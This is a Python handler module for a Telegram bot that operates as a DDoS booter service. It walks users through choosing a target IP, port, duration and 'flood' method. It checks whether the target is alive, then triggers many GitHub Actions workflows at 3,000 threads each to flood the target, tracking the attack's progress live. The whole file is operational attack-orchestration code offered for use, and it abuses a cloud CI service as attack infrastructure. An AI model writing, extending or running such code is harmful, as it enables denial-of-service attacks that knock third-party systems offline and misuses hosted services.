# handlers/launch.py
from pyrogram import filters
from pyrogram.types import Message, CallbackQuery
from config import OWNER_ID, WORKFLOW_COUNT
from database import is_active, is_admin, add_attack, add_log
from keyboards import attack_confirm, method_select, stop_confirm, main_menu
from services.github import launch_all, get_all_runs, test_connection
from utils.validators import valid_ip, valid_port, valid_duration, check_ip_alive, check_udp_port
import state
import time
import asyncio
from datetime import datetime

def register(app):

    @app.on_callback_query(filters.regex("^launch$"))
    async def launch_start(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if not (user_id == OWNER_ID or is_admin(user_id) or is_active(user_id)):
            return await cb.answer("❌ No access", show_alert=True)
        state.attack_state[user_id] = {"step": "ip"}
        await cb.message.edit_text(
            "**🎯 LAUNCH ATTACK**\n\n"
            "**Step 1/4 — Send target IP:**\n"
            "Example: `1.1.1.1`\n\n"
            "/cancel to cancel"
        )

    @app.on_message(filters.private & filters.text &
                    ~filters.command(["start", "cancel"]))
    async def attack_input(client, message: Message):
        user_id = message.from_user.id
        if user_id not in state.attack_state:
            return
        s = state.attack_state[user_id]
        if s.get("step") not in ["ip", "port", "duration"]:
            return
        text = message.text.strip()
        step = s["step"]

        if step == "ip":
            if not valid_ip(text):
                return await message.reply("❌ **Invalid IP**, try again:")
            s["ip"]   = text
            s["step"] = "port"
            return await message.reply(
                f"**✅ IP:** `{text}`\n\n"
                f"**Step 2/4 — Send target PORT:**\n"
                f"Example: `80` or `7777`"
            )

        if step == "port":
            if not valid_port(text):
                return await message.reply("❌ **Invalid port** (1-65535), try again:")
            s["port"] = int(text)
            s["step"] = "duration"
            return await message.reply(
                f"**✅ Port:** `{text}`\n\n"
                f"**Step 3/4 — Send duration (seconds):**\n"
                f"Example: `300` | Max: `21000`"
            )

        if step == "duration":
            if not valid_duration(text):
                return await message.reply("❌ **Invalid** (1-21000), try again:")
            s["duration"] = int(text)
            s["step"]     = "checking"

            # ===== AUTO IP CHECK =====
            checking_msg = await message.reply(
                f"**🔍 Checking target...**\n"
                f"**🌐** `{s['ip']}:{s['port']}`\n"
                f"⏳ Please wait..."
            )

            loop      = asyncio.get_event_loop()
            ip_alive  = await loop.run_in_executor(None, check_ip_alive, s["ip"])
            udp_status= await loop.run_in_executor(None, check_udp_port, s["ip"], s["port"])

            if ip_alive is True:
                ip_icon = "🟢 LIVE"
            elif ip_alive is False:
                ip_icon = "🔴 UNREACHABLE"
            else:
                ip_icon = "⚪ UNKNOWN"

            if udp_status == "open":
                udp_icon = "🟢 Open"
            elif udp_status == "open_or_filtered":
                udp_icon = "🟡 Open/Filtered"
            elif udp_status == "closed":
                udp_icon = "🔴 Closed"
            else:
                udp_icon = "⚪ Unknown"

            s["ip_status"]  = ip_icon
            s["udp_status"] = udp_icon
            s["step"]       = "method"

            await checking_msg.edit_text(
                f"**✅ Step 3/4 Done**\n\n"
                f"**🔍 TARGET CHECK**\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"**🌐 IP:** `{s['ip']}` → {ip_icon}\n"
                f"**🔌 UDP:{s['port']}** → {udp_icon}\n"
                f"**⏰ Duration:** `{text}s`\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"**Step 4/4 — Select method:**",
                reply_markup=method_select()
            )

    @app.on_callback_query(filters.regex("^method_"))
    async def method_selected(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if user_id not in state.attack_state:
            return await cb.answer("❌ No attack pending", show_alert=True)
        s = state.attack_state[user_id]
        if s.get("step") != "method":
            return await cb.answer("❌ Invalid step", show_alert=True)

        method    = cb.data.replace("method_", "").upper()
        s["method"] = f"{method} FLOOD"

        ip_icon  = s.get("ip_status",  "⚪")
        udp_icon = s.get("udp_status", "⚪")

        await cb.message.edit_text(
            f"**🎯 CONFIRM ATTACK**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"**🌐 Target:** `{s['ip']}:{s['port']}`\n"
            f"**📊 IP Status:** {ip_icon}\n"
            f"**🔌 UDP Status:** {udp_icon}\n"
            f"**⏰ Duration:** `{s['duration']}s`\n"
            f"**⚡ Method:** `{s['method']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"**🖥️ Servers:** `{WORKFLOW_COUNT}`\n"
            f"**🧵 Threads/Server:** `3,000`\n"
            f"**📊 Total Threads:** `{WORKFLOW_COUNT * 3000:,}`\n\n"
            f"**⚠️ Ready to launch?**",
            reply_markup=attack_confirm()
        )

    @app.on_callback_query(filters.regex("^confirm_attack$"))
    async def confirm_attack(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if user_id not in state.attack_state:
            return await cb.answer("❌ No attack pending", show_alert=True)

        s   = state.attack_state.pop(user_id)
        msg = await cb.message.edit_text(
            f"**⏳ Verifying target...**\n"
            f"**🌐** `{s['ip']}:{s['port']}`"
        )

        # ===== CONFIRM এ QUICK RE-CHECK =====
        loop     = asyncio.get_event_loop()
        ip_alive = await loop.run_in_executor(None, check_ip_alive, s["ip"])

        if ip_alive is False:
            return await msg.edit_text(
                f"**❌ TARGET OFFLINE**\n\n"
                f"**🌐 IP:** `{s['ip']}` → 🔴 Unreachable\n\n"
                f"Target is down. Attack cancelled.",
                reply_markup=main_menu(
                    is_admin=is_admin(user_id),
                    is_owner=user_id == OWNER_ID
                )
            )

        await msg.edit_text("**⏳ Connecting to GitHub...**")

        # GitHub connection check
        connection_ok = test_connection()
        if not connection_ok:
            add_log("attack_failed", user_id, "GitHub connection failed")
            return await msg.edit_text(
                "**❌ GITHUB ERROR**\n\nConnection failed.\nCheck Token Management.",
                reply_markup=main_menu(
                    is_admin=is_admin(user_id),
                    is_owner=user_id == OWNER_ID
                )
            )

        await msg.edit_text(
            f"**⏳ Launching {WORKFLOW_COUNT} workflows...**\n"
            f"**🎯** `{s['ip']}:{s['port']}`"
        )

        threads = 3000
        count   = launch_all(s["ip"], s["port"], threads, s["duration"])

        if count == 0:
            add_log("attack_failed", user_id, "No workflows triggered")
            return await msg.edit_text(
                "**❌ FAILED**\n\nNo workflows started.\nCheck GitHub repo/token.",
                reply_markup=main_menu(
                    is_admin=is_admin(user_id),
                    is_owner=user_id == OWNER_ID
                )
            )

        attack_id  = f"atk_{user_id}_{int(time.time())}"
        started_ts = time.time()

        state.current_target = {
            "ip":         s["ip"],
            "port":       s["port"],
            "threads":    threads,
            "duration":   s["duration"],
            "started_at": started_ts
        }
        state.watchdog_enabled = True

        add_attack(attack_id, {
            "user_id":            user_id,
            "ip":                 s["ip"],
            "port":               s["port"],
            "duration":           s["duration"],
            "method":             s["method"],
            "servers":            count,
            "threads_per_server": threads,
            "total_threads":      count * threads,
            "started_at":         datetime.now().isoformat(),
            "status":             "running"
        })
        add_log("attack_started", user_id, f"{s['ip']}:{s['port']}")

        # Live status updates
        for check in range(3):
            await asyncio.sleep(5)
            runs    = get_all_runs()
            running = sum(1 for wf, st in runs.items()
                         if wf.startswith("bot") and st in ["in_progress", "queued"])
            queued  = sum(1 for wf, st in runs.items()
                         if wf.startswith("bot") and st == "queued")
            active  = running - queued
            elapsed = int(time.time() - started_ts)
            remaining = max(0, s["duration"] - elapsed)

            await msg.edit_text(
                f"**🎯 ATTACK LIVE**\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"**🆔 ID:** `{attack_id}`\n"
                f"**🌐 Target:** `{s['ip']}:{s['port']}`\n"
                f"**⚡ Method:** `{s['method']}`\n"
                f"**⏰ Duration:** `{s['duration']}s`\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"**🖥️ Triggered:** `{count}/{WORKFLOW_COUNT}`\n"
                f"**▶️ Active:** `{active}` | **⏳ Queue:** `{queued}`\n"
                f"**🧵 Threads:** `{active * threads:,}`\n"
                f"**⏱️ Elapsed:** `{elapsed}s` | **Left:** `{remaining}s`\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"{'🟢 RUNNING' if running > 0 else '🟡 STARTING...'}",
                reply_markup=stop_confirm()
            )

    @app.on_callback_query(filters.regex("^cancel_attack$"))
    async def cancel_attack(client, cb: CallbackQuery):
        state.attack_state.pop(cb.from_user.id, None)
        await cb.message.edit_text(
            "❌ **Cancelled.**",
            reply_markup=main_menu(
                is_admin=is_admin(cb.from_user.id),
                is_owner=cb.from_user.id == OWNER_ID
            )
        )
